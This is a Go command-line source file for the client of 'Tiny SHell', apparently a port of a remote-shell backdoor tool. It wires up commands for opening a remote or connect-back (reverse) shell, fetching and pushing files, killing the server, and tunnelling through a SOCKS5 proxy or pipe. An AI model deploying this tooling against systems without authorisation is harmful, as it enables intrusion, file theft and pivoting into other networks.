package cmd

import (
	"fmt"
	"tsh-go/internal/client"
	"tsh-go/internal/constants"

	"github.com/spf13/cobra"
)

func init() {
	clientCmd.PersistentFlags().StringVarP(&clientSecret, "secret", "s", defaultSecret, "Pre-shared secret for encryption")
	clientCmd.PersistentFlags().StringVarP(&clientHost, "connect", "c", "", "Target host, use 'cb' for connect-back mode")
	clientCmd.MarkPersistentFlagRequired("connect")
	clientCmd.PersistentFlags().IntVarP(&clientPort, "port", "p", defaultPort, "Target port")
	clientCmd.AddCommand(clientKillCmd)
	clientCmd.AddCommand(clientGetCmd)
	clientCmd.AddCommand(clientPutCmd)
	clientCmd.AddCommand(clientSocks5Cmd)
	clientCmd.AddCommand(clientPipeCmd)
	rootCmd.AddCommand(clientCmd)
}

var clientHost string
var clientSecret string
var clientPort int

var clientCmd = &cobra.Command{
	Use:     "client -c {target | cb} [-p port] [-s secret] [action | command]",
	Aliases: []string{"c"},
	Args: func(cmd *cobra.Command, args []string) error {
		if len(args) > 1 {
			return fmt.Errorf("the action or command must be a single argument, did you forget to quote it?")
		}
		return nil
	},
	Short: "Tiny SHell client",
	Long:  `Tiny SHell client connects to remote server or accept incoming connection, and does the specified action.`,
	Example: `  tsh client -c 172.16.123.45
  tsh client -c cb -p 1337
  tsh client -c 127.0.0.1 -s hello 'ls -la /'`,
	Run: func(cmd *cobra.Command, args []string) {
		arg := client.RunShellArgs{Command: "exec bash --login"}
		if len(args) > 0 {
			arg.Command = args[0]
		}
		client.Run([]byte(clientSecret), clientHost, clientPort, constants.RunShell, arg)
	},
}

var clientKillCmd = &cobra.Command{
	Use:   "kill",
	Args:  cobra.NoArgs,
	Short: "Kill remote server",
	Run: func(cmd *cobra.Command, args []string) {
		client.Run([]byte(clientSecret), clientHost, clientPort, constants.Kill, nil)
	},
}
var clientGetCmd = &cobra.Command{
	Use:   "get <source-file> <dest>",
	Args:  cobra.ExactArgs(2),
	Short: "Get file from remote",
	Long: `Get file from remote, the destination can be a directory or a file.
 The source can be '-' to read from stdin.
 If the destination is a directory, the file will be saved with the same name as the source file.
 If the destination is a file or not exist, the file will be saved with the specified name.`,
	Run: func(cmd *cobra.Command, args []string) {
		arg := client.GetFileArgs{Src: args[0], Dst: args[1]}
		client.Run([]byte(clientSecret), clientHost, clientPort, constants.GetFile, arg)
	},
}
var clientPutCmd = &cobra.Command{
	Use:   "put <source-file> <dest>",
	Args:  cobra.ExactArgs(2),
	Short: "Put local file to remote",
	Long: `Put local file to remote, the destination can be a directory or a file.
 The destination can be '-' to write to stdout.
 If the destination is a directory, the file will be saved with the same name as the source file.
 If the destination is a file or not exist, the file will be saved with the specified name.`,
	Run: func(cmd *cobra.Command, args []string) {
		arg := client.PutFileArgs{Src: args[0], Dst: args[1]}
		client.Run([]byte(clientSecret), clientHost, clientPort, constants.PutFile, arg)
	},
}
var clientSocks5Cmd = &cobra.Command{
	Use:   "socks5 host:port",
	Args:  cobra.ExactArgs(1),
	Short: "Start a local socks5 proxy (not recommended to be used in connect-back mode)",
	Run: func(cmd *cobra.Command, args []string) {
		arg := client.Socks5Args{Socks5Addr: args[0]}
		client.Run([]byte(clientSecret), clientHost, clientPort, constants.SOCKS5, arg)
	},
}
var clientPipeCmd = &cobra.Command{
	Use:   "pipe host:port",
	Args:  cobra.ExactArgs(1),
	Short: "Redirect stdin/stdout to remote tcp target",
	Long: `Redirect stdin/stdout to remote tcp target.
 It is similar to starting socks5 and connect it using 'nc -X 5 -x localhost:9050 host port'.
 Example use case: ssh -o ProxyCommand='tsh client -c target pipe %h:%p' user@host
`,
	Run: func(cmd *cobra.Command, args []string) {
		arg := client.PipeArgs{TargetAddr: args[0]}
		client.Run([]byte(clientSecret), clientHost, clientPort, constants.Pipe, arg)
	},
}
